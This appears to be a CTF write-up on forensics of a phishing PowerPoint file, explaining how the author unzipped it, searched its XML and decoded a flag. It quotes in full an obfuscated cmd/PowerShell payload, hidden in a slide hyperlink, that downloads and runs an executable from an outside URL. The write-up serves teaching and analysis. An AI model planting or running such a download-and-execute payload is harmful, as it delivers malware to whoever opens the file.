---
title: "HTB Cyber Apocalypse CTF - AlienPhish"
# author:
#   name: 0xKirito
#   link: https://github.com/0xKirito
date: 2021-04-27T05:17:41+05:30
categories: [Writeups, CTF]
tags: [HTB, CTF, Forensics, Maldocs, Malware Analysis]
render_with_liquid: false
---

## AlienPhish - PowerPoint File Forensics

- I came up with this cool little trick on the spot and decided to use VS Code to just search through all the files at once.
- Extract the PowerPoint file with `unzip file.pptx` and then open the entire directory in VS Code (`code .` if you have it set up that way in terminal/env) for searching through all the files quickly and easily. I use VS Code. You can use any other code editor you use/like that can search through all the files at once (or you could use `grep` but I'd rather go through everything with a code editor when doing any kind of file forensics).
- Search for keywords like `vba`, `cmd`, `exe`, etc.
- Found what I wanted immediately in `slide1.xml.rels` file with `cmd` and `exe` keyword search.
- That file had a malicious `cmd` payload in `Target` attribute:

```
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22" TargetMode="External"/>
```

```
"cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22"
```

- We can tell from the URL `exe.x/neila.htraeyortsed/:ptth` that some part of the payload is reversed.
- But the file name that this powershell command is downloading looks like an encoded string.
- `99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q` looked like an encoded value so went to [CyberChef](https://gchq.github.io/CyberChef/), reversed and decoded to Base64 and got the flag.
- Encoded Value <span class="fat-arrow">=></span> Reverse <span class="fat-arrow">=></span> `Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99` <span class="fat-arrow">=></span> Base64 Decode <span class="fat-arrow">=></span> Flag <span class="fat-arrow">=></span> `CHTB{pH1sHiNg_w0_m4cr0s>??}`
- But that flag was not accepted and showed incorrect. Probably some decoding error so I went back to [CyberChef](https://gchq.github.io/CyberChef/) and in Base64 Decoding, there was an option for `URL Safe` decoding which gave <span class="fat-arrow">=></span> `CHTB{pH1sHiNg_w0_m4cr0s???}`. This was one accepted.

